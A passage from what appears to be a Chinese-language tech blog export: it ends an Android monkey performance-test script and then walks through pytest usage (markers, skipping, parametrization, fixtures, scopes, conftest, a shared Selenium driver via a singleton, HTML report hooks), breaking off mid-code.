<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ba.attached_devices():</span><br><span class="line">       mc = BaseMonkeyConfig.monkeyConfig(PATH(&quot;monkey.ini&quot;))</span><br><span class="line">       # 打开想要的activity</span><br><span class="line">       ba.open_app(mc[&quot;package_name&quot;], mc[&quot;activity&quot;])</span><br><span class="line">       temp = &quot;&quot;</span><br><span class="line">        # monkey开始测试</span><br><span class="line">       start_monkey(mc[&quot;cmd&quot;], mc[&quot;log&quot;])</span><br><span class="line">       time.sleep(1)</span><br><span class="line">       starttime = datetime.datetime.now()</span><br><span class="line">       while True:</span><br><span class="line">           with open(mc[&quot;monkey_log&quot;], encoding=&#x27;utf-8&#x27;) as monkeylog:</span><br><span class="line">               BaseMonitor.get_cpu(mc[&quot;package_name&quot;])</span><br><span class="line">               BaseMonitor.get_men(mc[&quot;package_name&quot;])</span><br><span class="line">               BaseMonitor.get_fps(mc[&quot;package_name&quot;])</span><br><span class="line">               BaseMonitor.get_battery()</span><br><span class="line">               BaseMonitor.get_flow(mc[&quot;package_name&quot;], mc[&quot;net&quot;])</span><br><span class="line">               time.sleep(1) # 每1秒采集检查一次</span><br><span class="line">               if monkeylog.read().count(&#x27;Monkey finished&#x27;) &gt; 0:</span><br><span class="line">                   endtime = datetime.datetime.now()</span><br><span class="line">                   print(&quot;测试完成咯&quot;)</span><br><span class="line">                   app = &#123;&quot;beforeBattery&quot;: BaseMonitor.get_battery(), &quot;net&quot;: mc[&quot;net&quot;], &quot;monkey_log&quot;: mc[&quot;monkey_log&quot;]&#125;</span><br><span class="line">                   report(app, str((endtime - starttime).seconds) + &quot;秒&quot;)</span><br><span class="line">                   bo.close()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>自动化测试</tag>
        <tag>android性能测试</tag>
        <tag>monkey</tag>
      </tags>
  </entry>
  <entry>
    <title>python-pytest全面解析</title>
    <url>/aposts/aaee9c81/</url>
    <content><![CDATA[<h2 id="运行pytest的三种方式"><a href="#运行pytest的三种方式" class="headerlink" title="运行pytest的三种方式"></a>运行pytest的三种方式</h2> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pytest</span><br><span class="line"></span><br><span class="line">@pytest.mark.finished</span><br><span class="line">def test_add():</span><br><span class="line">    print(&quot;测试函数：test_add&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.mark.finished</span><br><span class="line">def test_subtract():</span><br><span class="line">    print(&quot;测试函数：test_subtract&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.mark.unfinished</span><br><span class="line">def test_no_finish():</span><br><span class="line">    pass</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    pytest.main([&quot;-s&quot;, &quot;pt_test1.py&quot;])</span><br></pre></td></tr></table></figure>
<h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pytest.main([&quot;-s&quot;, &quot;pt_test1.py&quot;])</span><br></pre></td></tr></table></figure>
<h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><ul>
<li><p>在pycharm中新建pytest<br><img src="/aposts/aaee9c81/pycharm1.png" alt="image.png"></p>
</li>
<li><p>点击运行即可<br><img src="/aposts/aaee9c81/pycharm2.png" alt="image.png"></p>
</li>
<li><p>使用命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\project\ut&gt;pytest pt_test1.py</span><br><span class="line">======================================================================= test session starts ========================================================================</span><br><span class="line">platform win32 -- Python 3.6.6, pytest-5.4.3, py-1.9.0, pluggy-0.13.1</span><br><span class="line">rootdir: D:\project\ut</span><br><span class="line">collected 2 items                                                                                                                                                   </span><br><span class="line"></span><br><span class="line">pt_test1.py ..                                                                                                                                                [100%]</span><br><span class="line"></span><br><span class="line">======================================================================== 2 passed in 0.02s =========================================================================</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="测试制定的函数"><a href="#测试制定的函数" class="headerlink" title="测试制定的函数"></a>测试制定的函数</h2><ul>
<li><code>::</code>制定测试函数<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pytest pt_test1.py::test_add</span><br><span class="line">pytest.main([&quot;pt_test1.py::test_add&quot;])</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><code>-k</code>模糊搜索,模糊搜索add的测试函数<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pytest -k add pt_test1.py</span><br><span class="line">pytest.main([&quot;-s&quot;, &quot;pt_test1.py&quot;, &quot;-k&quot;, &quot;add&quot;])</span><br></pre></td></tr></table></figure></li>
<li>使用<code>pytest.mark</code>标注后，使用<code>-m</code>参数<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@pytest.mark.finished</span><br><span class="line">def test_add():</span><br><span class="line">    print(&quot;测试函数：test_add&quot;)</span><br><span class="line"></span><br><span class="line">pytest -m finished pt_test1.py</span><br></pre></td></tr></table></figure></li>
<li>一个函数可以打多个标记；多个函数也可以打相同的标记，运行逻辑：</li>
</ul>
<p><code>pytest -m &quot;finished and commit&quot;</code></p>
<h2 id="跳过测试"><a href="#跳过测试" class="headerlink" title="跳过测试"></a>跳过测试</h2><ul>
<li><code>pytest.mark.skip</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test_skip.py</span><br><span class="line">@pytest.mark.skip(reason=&#x27;out-of-date api&#x27;)</span><br><span class="line">def test_connect():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">pytest tests/test-function/test_skip.py</span><br></pre></td></tr></table></figure></li>
<li><code>pytest.mark.skipif</code> 为测试函数指定被忽略的条件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@pytest.mark.skipif(conn.__version__ &lt; &#x27;0.2.0&#x27;,</span><br><span class="line">                    reason=&#x27;not supported until v0.2.0&#x27;)</span><br><span class="line">def test_api():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">pytest tests/test-function/test_skip.py</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="参数化"><a href="#参数化" class="headerlink" title="参数化"></a>参数化</h2><ul>
<li>密码长度的测试函数<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test_parametrize.py</span><br><span class="line"></span><br><span class="line">@pytest.mark.parametrize(&#x27;passwd&#x27;,</span><br><span class="line">                      [&#x27;123456&#x27;,</span><br><span class="line">                       &#x27;abcdefdfs&#x27;,</span><br><span class="line">                       &#x27;as52345fasdf4&#x27;])</span><br><span class="line">def test_passwd_length(passwd):</span><br><span class="line">    assert len(passwd) &gt;= 8</span><br><span class="line"></span><br><span class="line">$ pytest tests/test-function/test_parametrize.py</span><br><span class="line">============================= test session starts =============================</span><br><span class="line">platform win32 -- Python 3.6.4, pytest-3.6.1, py-1.5.2, pluggy-0.6.0</span><br><span class="line">rootdir: F:\self-repo\learning-pytest, inifile:</span><br><span class="line">collected 3 items</span><br><span class="line"></span><br><span class="line">tests\test-function\test_parametrize.py F..                              [100%]</span><br><span class="line"></span><br><span class="line">================================== FAILURES ===================================</span><br></pre></td></tr></table></figure></li>
<li>再看一个多参数的例子，用于校验用户密码：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test_parametrize.py</span><br><span class="line"></span><br><span class="line">@pytest.mark.parametrize(&#x27;user, passwd&#x27;,</span><br><span class="line">                         [(&#x27;jack&#x27;, &#x27;abcdefgh&#x27;),</span><br><span class="line">                          (&#x27;tom&#x27;, &#x27;a123456a&#x27;)])</span><br><span class="line">def test_passwd_md5(user, passwd):</span><br><span class="line">    db = &#123;</span><br><span class="line">        &#x27;jack&#x27;: &#x27;e8dc4081b13434b45189a720b77b6818&#x27;,</span><br><span class="line">        &#x27;tom&#x27;: &#x27;1702a132e769a623c1adb78353fc9503&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    import hashlib</span><br><span class="line"></span><br><span class="line">    assert hashlib.md5(passwd.encode()).hexdigest() == db[user]</span><br><span class="line"></span><br><span class="line">$ pytest -v tests/test-function/test_parametrize.py::test_passwd_md5_id</span><br><span class="line">============================= test session starts =============================</span><br><span class="line">platform win32 -- Python 3.6.4, pytest-3.6.1, py-1.5.2, pluggy-0.6.0 -- c:\anaconda3\python.exe</span><br><span class="line">cachedir: .pytest_cache</span><br><span class="line">rootdir: F:\self-repo\learning-pytest, inifile:</span><br><span class="line">collected 2 items</span><br><span class="line"></span><br><span class="line">tests/test-function/test_parametrize.py::test_passwd_md5_id[User&lt;Jack&gt;] PASSED [ 50%]</span><br><span class="line">tests/test-function/test_parametrize.py::test_passwd_md5_id[User&lt;Tom&gt;] PASSED [100%]</span><br><span class="line"></span><br><span class="line">========================== 2 passed in 0.07 seconds ===========================</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><ul>
<li>固件（<code>Fixture</code>）是一些函数，<code>pytest </code>会在执行测试函数之前（或之后）加载运行它们<br>-<code> Pytest</code> 使用<code>pytest.fixture()</code>定义固件，下面是最简单的固件，只返回北京邮编<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">@pytest.fixture()</span><br><span class="line">def postcode():</span><br><span class="line">    return &#x27;010&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test_postcode(postcode):</span><br><span class="line">    assert postcode == &#x27;010&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="预处理和后处理"><a href="#预处理和后处理" class="headerlink" title="预处理和后处理"></a>预处理和后处理</h3><ul>
<li>很多时候需要在测试前进行预处理（如新建数据库连接），并在测试完成进行清理（关闭数据库连接）。</li>
<li><code>Pytest </code>使用 <code>yield</code> 关键词将固件分为两部分，<strong>yield 之前的代码属于预处理</strong>，会在测试前执行；<strong>yield 之后的代码属于后处理</strong>，将在测试完成后执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test_db.py</span><br><span class="line"></span><br><span class="line">@pytest.fixture()</span><br><span class="line">def db():</span><br><span class="line">    print(&#x27;Connection successful&#x27;)</span><br><span class="line"></span><br><span class="line">    yield</span><br><span class="line"></span><br><span class="line">    print(&#x27;Connection closed&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def search_user(user_id):</span><br><span class="line">    d = &#123;</span><br><span class="line">        &#x27;001&#x27;: &#x27;xiaoming&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    return d[user_id]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test_search(db):</span><br><span class="line">    assert search_user(&#x27;001&#x27;) == &#x27;xiaoming</span><br><span class="line"></span><br><span class="line">============================= test session starts =============================</span><br><span class="line">platform win32 -- Python 3.6.4, pytest-3.6.1, py-1.5.2, pluggy-0.6.0</span><br><span class="line">rootdir: F:\self-repo\learning-pytest, inifile:</span><br><span class="line">collected 1 item</span><br><span class="line"></span><br><span class="line">tests\fixture\test_db.py Connection successful</span><br><span class="line">.Connection closed</span><br></pre></td></tr></table></figure>

<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>在定义固件时，通过 <code>scope</code> 参数声明作用域，可选项有：</p>
<ul>
<li><code>function</code>: 函数级，每个测试函数都会执行一次固件；默认的作用域为 function</li>
<li><code>class</code>: 类级别，每个测试类执行一次，所有方法都可以使用；</li>
<li><code>module</code>: 模块级，每个模块执行一次，模块内函数和方法都可使用；</li>
<li><code>session</code>: 会话级，一次测试只执行一次，所有被找到的函数和方法都可用。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@pytest.fixture(scope=&#x27;function&#x27;)</span><br><span class="line">def func_scope():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.fixture(scope=&#x27;module&#x27;)</span><br><span class="line">def mod_scope():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.fixture(scope=&#x27;session&#x27;)</span><br><span class="line">def sess_scope():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.fixture(scope=&#x27;class&#x27;)</span><br><span class="line">def class_scope():</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure></li>
<li>对于类使用作用域，需要使用 pytest.mark.usefixtures （对函数和方法也适用）：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test_scope.py</span><br><span class="line"></span><br><span class="line">@pytest.mark.usefixtures(&#x27;class_scope&#x27;)</span><br><span class="line">class TestClassScope:</span><br><span class="line">    def test_1(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def test_2(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">$ pytest --setup-show tests/fixture/test_scope.py::TestClassScope</span><br><span class="line">============================= test session starts =============================</span><br><span class="line">platform win32 -- Python 3.6.4, pytest-3.6.1, py-1.5.2, pluggy-0.6.0</span><br><span class="line">rootdir: F:\self-repo\learning-pytest, inifile:</span><br><span class="line">collected 2 items</span><br><span class="line"></span><br><span class="line">tests\fixture\test_scope.py</span><br><span class="line">    SETUP    C class_scope</span><br><span class="line">        tests/fixture/test_scope.py::TestClassScope::()::test_1 (fixtures used: class_scope).</span><br><span class="line">        tests/fixture/test_scope.py::TestClassScope::()::test_2 (fixtures used: class_scope).</span><br><span class="line">    TEARDOWN C class_scope</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="使用命令行在pytest中传递多个参数"><a href="#使用命令行在pytest中传递多个参数" class="headerlink" title="使用命令行在pytest中传递多个参数"></a>使用命令行在pytest中传递多个参数</h2><ul>
<li>配置conftest.py<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># conftest.py</span><br><span class="line">import pytest</span><br><span class="line">def pytest_addoption(parser):</span><br><span class="line">    parser.addoption(&quot;--input1&quot;, action=&quot;store&quot;, default=&quot;default input1&quot;)</span><br><span class="line">    parser.addoption(&quot;--input2&quot;, action=&quot;store&quot;, default=&quot;default input2&quot;)</span><br><span class="line"></span><br><span class="line">@pytest.fixture</span><br><span class="line">def input1(request):</span><br><span class="line">    return request.config.getoption(&quot;--input1&quot;)</span><br><span class="line"></span><br><span class="line">@pytest.fixture</span><br><span class="line">def input2(request):</span><br><span class="line">    return request.config.getoption(&quot;--input2&quot;)</span><br></pre></td></tr></table></figure></li>
<li>编写测函数<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test.py</span><br><span class="line">import pytest</span><br><span class="line"></span><br><span class="line">@pytest.mark.unit</span><br><span class="line">def test_print_name(input1, input2):</span><br><span class="line">    print (&quot;Displaying input1: %s&quot; % input1)</span><br><span class="line">    print(&quot;Displaying input2: %s&quot; % input2)</span><br></pre></td></tr></table></figure></li>
<li>执行命令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;py.test -s test.py --input1 tt --input2 12</span><br><span class="line">================================================= test session starts =================================================</span><br><span class="line">platform win32 -- Python 3.7.0, pytest-4.1.1, py-1.7.0, pluggy-0.8.1</span><br><span class="line">rootdir: pytest, inifile:</span><br><span class="line">collected 1 item</span><br><span class="line"></span><br><span class="line">test.py Displaying input1: tt</span><br><span class="line">Displaying input2: 12</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">============================================== 1 passed in 0.04 seconds ====================================</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="其他的一些参数总结"><a href="#其他的一些参数总结" class="headerlink" title="其他的一些参数总结"></a>其他的一些参数总结</h2><ul>
<li><code>-v, --verbose</code><br>详细结果<br>-<code> -q, --quiet</code><br> 极简结果显示，简化控制台的输出，可以看出输出信息和之前不添加-q不信息不一样， 下图中有两个..点代替了pass结果<br>-<code> -s</code><br>输入我们用例中的调式信息，比如print的打印信息等，我们在用例中加上一句 print(driver.title)，我们再运行一下我们的用例看看，调试信息输出<br>-<code> -V</code><br>可以输出用例更加详细的执行信息，比如用例所在的文件及用例名称等</li>
<li><code>--junit-xml=path</code><br>输出xml文件格式，在与jenkins做集成时使用</li>
<li><code>--result-log=path</code><br>将最后的结果保存到本地文件中</li>
</ul>
<p><strong>本文来自</strong></p>
<ul>
<li><a href="https://learning-pytest.readthedocs.io/zh/latest/index.html">pytest使用手册</a></li>
<li><a href="https://mlog.club/article/2056731">python-如何使用命令行在pytest中传递多个参数</a></li>
</ul>
<h2 id="兼容unittest中的setup"><a href="#兼容unittest中的setup" class="headerlink" title="兼容unittest中的setup"></a>兼容unittest中的setup</h2><ul>
<li>使用<code>setup</code>,<code>setup_cass</code>,<code>teardown_class</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class TestCase():</span><br><span class="line">    def setup(self):</span><br><span class="line">        print(&quot;setup: 每个用例开始前执行&quot;)</span><br><span class="line">    def teardown(self):</span><br><span class="line">        print(&quot;teardown: 每个用例结束后执行&quot;)</span><br><span class="line">    def setup_class(self):</span><br><span class="line">        print(&quot;setup_class：所有用例执行之前&quot;)</span><br><span class="line">    def teardown_class(self):</span><br><span class="line">        print(&quot;teardown_class：所有用例执行之前&quot;)</span><br><span class="line">    def setup_method(self):</span><br><span class="line">        print(&quot;setup_method: 每个用例开始前执行&quot;)</span><br><span class="line">    def teardown_method(self):</span><br><span class="line">        print(&quot;teardown_method: 每个用例结束后执行&quot;)</span><br><span class="line">    def test_one(self):</span><br><span class="line">        print(&quot;正在执行----test_one&quot;)</span><br><span class="line">        x = &quot;this&quot;</span><br><span class="line">        assert &#x27;h&#x27; in x</span><br><span class="line">    def test_three(self):</span><br><span class="line">        print(&quot;正在执行test_two&quot;)</span><br><span class="line">        a = &quot;hello&quot;</span><br><span class="line">        b = &quot;hello word&quot;</span><br><span class="line">        assert a in b</span><br><span class="line">    def add(self,a, b):</span><br><span class="line">        print(&quot;这是加减法&quot;)</span><br><span class="line">        return a + b</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pytest.main([&#x27;-s&#x27;, &#x27;test_fixt_class&#x27;])</span><br></pre></td></tr></table></figure></li>
<li>来自<a href="https://www.cnblogs.com/tallme/p/11369791.html">https://www.cnblogs.com/tallme/p/11369791.html</a></li>
</ul>
<h2 id="conftest"><a href="#conftest" class="headerlink" title="conftest"></a>conftest</h2><ul>
<li>多用例的数据可以共,比如selenium中的driver的</li>
<li>conftest.py文件名字不能更改</li>
<li>conftest.py与运行的用例要在同一个pakage下，并且有__init__.py文件</li>
<li>如下图，我可以放到和用例testcase同级文件夹目录，也可以放到testcase文件夹下面的用例目录</li>
</ul>
<p><img src="/aposts/aaee9c81/pycharm3.png" alt="image.png"></p>
<ul>
<li>代码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># conftest.py</span><br><span class="line">import pytest</span><br><span class="line">from selenium import webdriver</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.fixture()</span><br><span class="line">def driver():</span><br><span class="line">    PATH = lambda p: os.path.abspath(</span><br><span class="line">        os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">    )</span><br><span class="line">    driver_path = PATH(&quot;../exe/chromedriver.exe&quot;)</span><br><span class="line">    driver = webdriver.Chrome(driver_path)</span><br><span class="line">    driver.get(&#x27;https://www.baidu.com&#x27;)</span><br><span class="line">    driver.maximize_window()</span><br><span class="line"></span><br><span class="line">    # 返回数据</span><br><span class="line">    yield driver</span><br><span class="line"></span><br><span class="line">    # 实现用例后置</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line">import pytest</span><br><span class="line"></span><br><span class="line"># test_case001.pu</span><br><span class="line"></span><br><span class="line">class TestClassName:</span><br><span class="line">    @pytest.mark.usefixtures(&quot;driver&quot;)</span><br><span class="line">    def test_func_name(self, driver):</span><br><span class="line">        driver.find_element_by_id(&quot;kw&quot;).click()</span><br></pre></td></tr></table></figure></li>
<li>执行:  <code>pytest -s testcase/</code></li>
</ul>
<h2 id="共享session"><a href="#共享session" class="headerlink" title="共享session"></a>共享session</h2><p>在selenium中，可以实现driver共享，不用每个用例都重新打开和关闭浏览器</p>
<p><img src="/aposts/aaee9c81/image-20220823100335089.png" alt="image-20220823100335089"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># conftest.py </span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">from selenium import webdriver</span><br><span class="line">import pytest</span><br><span class="line"></span><br><span class="line">@pytest.fixture(scope=&#x27;session&#x27;)</span><br><span class="line">def driver(request):</span><br><span class="line">    PATH = lambda p: os.path.abspath(</span><br><span class="line">        os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">    )</span><br><span class="line">    chromedriver = PATH(&quot;exe/chromedriver.exe&quot;)</span><br><span class="line">    os.environ[&quot;webdriver.chrome.driver&quot;] = chromedriver</span><br><span class="line">    driver = webdriver.Chrome(chromedriver)</span><br><span class="line">    driver.maximize_window()  # 将浏览器最大化</span><br><span class="line">    driver.implicitly_wait(2)</span><br><span class="line">    # openurl = &quot;http://www.baidu.com&quot;</span><br><span class="line">    # driver.get(openurl)</span><br><span class="line"></span><br><span class="line">    def end():</span><br><span class="line">        driver.quit()</span><br><span class="line"></span><br><span class="line">    request.addfinalizer(end)  # 终结函数</span><br><span class="line">    return driver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># test_1.py</span><br><span class="line">import pytest</span><br><span class="line">def test_001(driver):</span><br><span class="line">    openurl = &quot;http://www.baidu.com&quot;</span><br><span class="line">    driver.get(openurl)</span><br><span class="line">    driver.find_element_by_id(&quot;kw&quot;).click()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pytest.main([&#x27;-v&#x27;, &#x27;test_1.py&#x27;])</span><br><span class="line"></span><br><span class="line"># test_2.py</span><br><span class="line">import pytest</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def test_001(driver):</span><br><span class="line">    # openurl = &quot;http://www.baidu.com&quot;</span><br><span class="line">    # driver.get(openurl)</span><br><span class="line">    driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;baidu&quot;)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pytest.main([&#x27;-v&#x27;, &#x27;test_2.py&#x27;])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>批量执行z</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pytest -s TestCase\</span><br></pre></td></tr></table></figure>

<h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><ul>
<li><p>单例是一种<strong>设计模式</strong>，应用该模式的类只会生成一个实例，单例模式保证了在程序的不同位置都<strong>可以且仅可以取到同一个对象实例</strong>：如果实例不存在，会创建一个实例；如果已存在就会返回这个实例</p>
</li>
<li><p>单例函数</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding:utf-8  </span><br><span class="line"># singleton.py</span><br><span class="line">#单例模式函数，用来修饰类</span><br><span class="line">def singleton(cls,*args,**kw):</span><br><span class="line">    instances = &#123;&#125;</span><br><span class="line">    def _singleton():</span><br><span class="line">        if cls not in instances:</span><br><span class="line">            instances[cls] = cls(*args,**kw)</span><br><span class="line">        return instances[cls]</span><br><span class="line">    return _singleton</span><br></pre></td></tr></table></figure>

<ul>
<li>selenium 的driver只有一个单例实例:<code>GetSeleniumDriver.py</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from Utils.singleton import singleton</span><br><span class="line">import os</span><br><span class="line">@singleton</span><br><span class="line">class GetSeleniumDriver(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        PATH = lambda p: os.path.abspath(</span><br><span class="line">        os.path.join(os.path.dirname(__file__), p))</span><br><span class="line">        chromedriver = PATH(&quot;../exe/chromedriver.exe&quot;)</span><br><span class="line">        os.environ[&quot;webdriver.chrome.driver&quot;] = chromedriver</span><br><span class="line">        self.driver = webdriver.Chrome(chromedriver)</span><br><span class="line">        self.driver.maximize_window()  # 将浏览器最大化</span><br><span class="line">        self.driver.implicitly_wait(2)</span><br></pre></td></tr></table></figure>

<ul>
<li>编写用例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test_3.py</span><br><span class="line"></span><br><span class="line">import pytest</span><br><span class="line">import time</span><br><span class="line">from Utils.GetSeleniumDriver import GetSeleniumDriver</span><br><span class="line">class TestCase003(object):</span><br><span class="line"></span><br><span class="line">   # 初始化</span><br><span class="line">    def setup_class(self):</span><br><span class="line">        self.driver=GetSeleniumDriver().driver</span><br><span class="line">        self.driver.get(&quot;http://www.baidu.com&quot;)</span><br><span class="line"></span><br><span class="line">    def test_003(self):</span><br><span class="line">        self.driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;baidu&quot;)</span><br><span class="line">        time.sleep(5)</span><br><span class="line">    # 清理后，影响其他函数</span><br><span class="line">    def teardown_class(self):</span><br><span class="line">        # self.driver.close()</span><br><span class="line">        # self.driver.quit()</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pytest.main([&#x27;-v&#x27;, &#x27;test_3.py&#x27;])</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test_4.py</span></span><br><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Utils.GetSeleniumDriver <span class="keyword">import</span> GetSeleniumDriver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestCase004</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setup_class</span>(<span class="params">self</span>):</span><br><span class="line">        self.driver = GetSeleniumDriver().driver</span><br><span class="line">        <span class="comment"># openurl = &quot;http://www.baidu.com&quot;</span></span><br><span class="line">        <span class="comment"># self.driver.get(openurl)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_004</span>(<span class="params">self</span>):</span><br><span class="line">        self.driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;baidu222&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teardown_class</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># self.driver.close()</span></span><br><span class="line">        <span class="comment"># self.driver.quit()</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>代码结构</li>
</ul>
<p><img src="/aposts/aaee9c81/image-20220916152333834.png" alt="image-20220916152333834"></p>
<ul>
<li><p><a href="https://zhuanlan.zhihu.com/p/37534850">Python单例模式(Singleton)的N种实现</a></p>
</li>
<li><p><a href="https://blog.csdn.net/qq_39208536/article/details/123214101">python单例模式&amp;selenium driver实现单例</a></p>
</li>
</ul>
<h2 id="html美化"><a href="#html美化" class="headerlink" title="html美化"></a>html美化</h2><p>在<code>conftest.py</code>中的优化的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.desired_capabilities <span class="keyword">import</span> DesiredCapabilities</span><br><span class="line"><span class="keyword">from</span> py._xmlgen <span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">_driver = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@pytest.fixture(<span class="params">scope=<span class="string">&#x27;session&#x27;</span>, autouse=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">driver</span>():</span><br><span class="line">    <span class="keyword">global</span> _driver</span><br><span class="line">    chromedriver=<span class="string">r&quot;D:\project\autoPlatform\webAuto\exe\chromedriver.exe&quot;</span></span><br><span class="line">    os.environ[<span class="string">&quot;webdriver.chrome.driver&quot;</span>] = chromedriver</span><br><span class="line">    _driver = webdriver.Chrome(chromedriver)</span><br><span class="line">    _driver.maximize_window()</span><br><span class="line">    _driver.get(<span class="string">&quot;https://www.baidu.com/&quot;</span>)</span><br><span class="line">    <span class="comment"># 返回数据</span></span><br><span class="line">    <span class="keyword">yield</span> _driver</span><br><span class="line">    <span class="comment"># 实现用例后置</span></span><br><span class="line">    <span class="comment"># _driver.close() # centos报错</span></span><br><span class="line">    _driver.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@pytest.mark.optionalhook</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_summary</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    #添加summary内容</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prefix.extend([html.p(<span class="string">&quot;所属部门: 测试组&quot;</span>)])</span><br><span class="line">    prefix.extend([html.p(<span class="string">&quot;框架设计: XXX&quot;</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span 